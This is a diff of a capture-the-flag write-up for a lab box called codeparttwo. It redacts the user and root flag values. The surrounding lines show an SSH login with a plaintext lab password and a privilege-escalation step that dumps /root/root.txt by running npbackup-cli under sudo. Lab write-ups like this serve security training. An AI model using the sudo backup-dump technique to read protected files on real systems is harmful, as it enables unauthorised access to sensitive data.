@@ -137,7 +137,7 @@ ssh marco@10.10.11.82
 marco@10.10.11.82's password: sweetangelbabylove
 
 marco@codeparttwo:~$ cat user.txt
-771341ef5ca50889a8f551030969f338
+[redacted]
 ```
 
 ---
@@ -160,7 +160,7 @@ We can abuse the backup functionality to read sensitive files. First, let's get 
 
 ```bash
 marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt --snapshot-id ed5dcf9b
-abd31641bdf8ef06c4cf8bc14f99db6c
+[redacted]
 ```
 
 ## Getting Root Shell (Optional)
